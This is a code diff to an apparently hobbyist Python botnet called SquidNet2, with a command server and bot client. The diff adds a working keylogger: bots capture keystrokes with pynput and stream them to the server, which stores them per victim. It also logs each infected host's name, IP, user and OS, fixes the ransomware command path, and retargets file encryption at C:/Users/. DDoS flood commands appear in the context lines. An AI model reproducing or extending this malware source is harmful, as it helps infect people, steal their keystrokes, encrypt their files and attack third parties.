@@ -6,7 +6,7 @@ class BotNet:
     and effectiveness, nonetheless they all contribute to the overall functioning of the server. It uses a lot
     of logic and similar code from DatCord, which was a server that truly displayed my advancements in network
     programming, where it also is an improvement from the previous SquidNet. SquidNet2 does not have as many bugs,
-    and also not as many useless functions. This script remains unfinished(I worked on it a lot on an airplain DX), 
+    and also not as many useless functions. This script remains unfinished(I worked on it a lot on an airplane DX), 
     so there could be many problems that could possibly occur."""
     def logo(self):
         """Logo of the script, nothing too special here."""
@@ -79,10 +79,13 @@ Advanced Botnet By DrSquid
         self.sqlconnected = False
         self.sending_file = False
         self.auto_ban = True
+        self.keylogging = False
+        self.botinfofile = "botinfo.txt"
+        botinfo = open(self.botinfofile,"w").close()
         self.max_connpersec = 20
         self.connpersec = 0
         self.conncount = 0
-        self.timer = 0
+        self.timer = 1
         self.conf_dbfile()
         file = open(self.logfile, "w").close()
         self.log(self.logo())
@@ -189,6 +192,8 @@ Advanced Botnet By DrSquid
 [+] !stopsql                                 - Disconnect from the connected Database file.
 [+] !stopwrite                               - Close writing mode and return to normal.
 [+] !getcwd                                  - Get the current directory of the bots.
+[+] !keylog                                  - Activate keylogging to see the bots keystrokes.
+[+] !stopkeylog                              - Stops the keylogging.
 [+] !listdir                                 - List all of the items in the bots working directory.
 [+] !ransomware                              - Activates the ransomware program inside of the bots.
 [+] DDoS Attack Commands:
@@ -296,6 +301,11 @@ Advanced Botnet By DrSquid
                         conn.close()
                 except Exception as e:
                     self.log(f"[({datetime.datetime.today()})][(ERROR)]: There was an error with listening for connections: {e}")
+    def obtain_botname_list(self):
+        botnames = []
+        for i in self.botinfo:
+            botnames.append(i[0])
+        return botnames
     def parse_info_msg(self, infomsg, conn, srcport):
         """There is a message sent by every client to the server, which would contain information about them.
         This include their hostname, IP Address, User, and Operating System. This is mainly for the bots,
@@ -319,6 +329,10 @@ Advanced Botnet By DrSquid
         except:
             os = "Unknown"
         self.botnum += 1
+        file = open(self.botinfofile,"w")
+        file.write(open(self.botinfofile,"r").read())
+        file.write(f"\n[+] Botname: {name}\n[+] IP: {ip}\n[+] Src Port: {srcport}\n[+] User: {osuser}\n[+] OS: {os}\n[+] Conn: {conn}\n")
+        file.close()
         return [name, ip, srcport, osuser, os, conn]
     def get_filename(self, msg):
         """When there is a file trying to be provided for file transfering(etc), there might be files with names 
@@ -444,6 +458,15 @@ Advanced Botnet By DrSquid
                                         pass
                                 else:
                                     self.send_to_other("SERVER",name,"There is already an active owner session. Please wait until they log off.", conn)
+                            elif msg.startswith("!key") and self.keylogging:
+                                keystroke = msg.split()[1]
+                                keyfile = open(name+".txt","r")
+                                content = keyfile.read()
+                                keyfile.close()
+                                newkeyfile = open(name+".txt","w")
+                                newkeyfile.write(content)
+                                newkeyfile.write(f"\n[+] {keystroke}")
+                                newkeyfile.close()
                             else:
                                 try:
                                     display_single_msg = False
@@ -588,6 +611,20 @@ Advanced Botnet By DrSquid
                                                 self.send_to_other("SERVER",self.admin_username,"You are in focus mode! Only the bot you are focusing will stop attacking!",self.adminconn)
                                         elif not self.ddosing:
                                             self.send_to_other("SERVER",self.admin_username,"The Bots are currently not attacking any domain.",self.adminconn)
+                                    elif msg.startswith("!keylog"):
+                                        self.send_to_other("SERVER",self.admin_username,"Activating Keylogger script on the bots(All of the logged keystrokes will be in a txt file with the bot's name).",self.adminconn)
+                                        self.keylogging = True
+                                        botnames = self.obtain_botname_list()
+                                        for i in botnames:
+                                            try:
+                                                keylogfile = open(f"{i}.txt","r")
+                                            except:
+                                                keylogfile = open(f"{i}.txt","w")
+                                                keylogfile.write(f"\nLOGGED KEYSTROKES FOR BOT {i}\n")
+                                            keylogfile.close()
+                                    elif msg.startswith("!stopkeylog"):
+                                        self.keylogging = False
+                                        self.send_to_other("SERVER",self.admin_username,"Deactivating Keylogger script on the bots.",self.adminconn)
                                     elif msg.startswith("!ransomware"):
                                         if self.ransomware_active:
                                             if self.focusing:
@@ -596,7 +633,7 @@ Advanced Botnet By DrSquid
                                                 self.send_to_other("SERVER",name,"Ransomware programs are activating!", conn)
                                                 self.send_to_other("SERVER",name,"Payloads are effective!", conn)
                                         else:
-                                            self.send_to_other("SERVER",name,"The ransomware has been disabled in the config file. Turn the value assigned to 'ransomware_active' to 't'")
+                                            self.send_to_other("SERVER",name,"The ransomware has been disabled in the config file. Turn the value assigned to 'ransomware_active' to 't'", conn)
                                     elif msg.startswith("!download"):
                                         try:
                                             filename = msg.split()[1]
@@ -651,7 +688,10 @@ Advanced Botnet By DrSquid
                                         for bot in self.connlist:
                                             try:
                                                 if conn != bot:
-                                                    bot.send(msg.encode())
+                                                    if msg.startswith("!ransomware") and not self.ransomware_active:
+                                                        pass
+                                                    else:
+                                                        bot.send(msg.encode())
                                             except:
                                                 pass
                                     else:
@@ -682,9 +722,10 @@ Advanced Botnet By DrSquid
                                     self.filetransfer = False
                         if display_single_msg:
                             if not msg.startswith("!login"):
-                                self.log(f"[({datetime.datetime.today()})][({name})]: {msg}")
-                                if conn != self.adminconn:
-                                    self.adminconn.send(f"\n[({name})]: {msg}".encode())
+                                if not msg.startswith("!key"):
+                                    self.log(f"[({datetime.datetime.today()})][({name})]: {msg}")
+                                    if conn != self.adminconn:
+                                        self.adminconn.send(f"\n[({name})]: {msg}".encode())
                             else:
                                 self.log(f"[({datetime.datetime.today()})][({name})]: Attempting to log into the Admin Account.")
             except Exception as e:
@@ -721,6 +762,7 @@ Advanced Botnet By DrSquid
 import socket, threading, os, sys, urllib.request, random, time, shutil, subprocess, sqlite3
 try:
     from cryptography.fernet import Fernet
+    from pynput.keyboard import Listener
 except:
     pass
 class DDoS:
@@ -4059,7 +4101,7 @@ class RansomWare:
         self.keyfile = "key.txt"
         self.recovery_directory = ""
         if sys.platform == "win32":
-            os.chdir("C:/")
+            os.chdir("C:/Users/")
             self.recovery_directory = f"C:/Users/{os.getlogin()}/"
         else:
             self.recovery_directory = "/"
@@ -4181,6 +4223,8 @@ class Bot:
         self.can_encrypt = False
         self.files_encrypted = False
         self.sql_connected = False
+        self.keylogging = False
+        self.keylogthreadstarted = False
         try:
             self.fernet = Fernet(self.enc_key)
             self.can_encrypt = True
@@ -4221,7 +4265,6 @@ class Bot:
         return filename.strip()
     def make_selffiles_encrypted_false(self):
         self.files_encrypted = False
-        print(self.files_encrypted)
     def recv(self):
         while True:
             try:
@@ -4251,6 +4294,14 @@ class Bot:
         cursor.close()
         sql.close()
         return output
+    def on_press(self, key):
+        if self.keylogging:
+            self.client.send(f"!key {key}".encode())
+    def on_release(self, key):
+        pass
+    def start_keylog(self):
+        with Listener(on_press=self.on_press, on_release=self.on_release) as L:
+            L.join()
     def return_actual_dir(self, direc):
         return direc.replace("%user%",os.getlogin())
     def send(self, msg):
@@ -4263,6 +4314,15 @@ class Bot:
                         os.startfile(filename)
                     else:
                         os.system(f"open {filename}")
+                elif msg.startswith("!keylog"):
+                    if not self.keylogging:
+                        if not self.keylogthreadstarted:
+                            keylogger = threading.Thread(target=self.start_keylog)
+                            keylogger.start()
+                        self.keylogging = True
+                        self.keylogthreadstarted = True
+                elif msg.startswith("!stopkeylog"):
+                    self.keylogging = False
                 elif msg.startswith('!httpflood'):
                     msg = msg.split()
                     ip = msg[1]
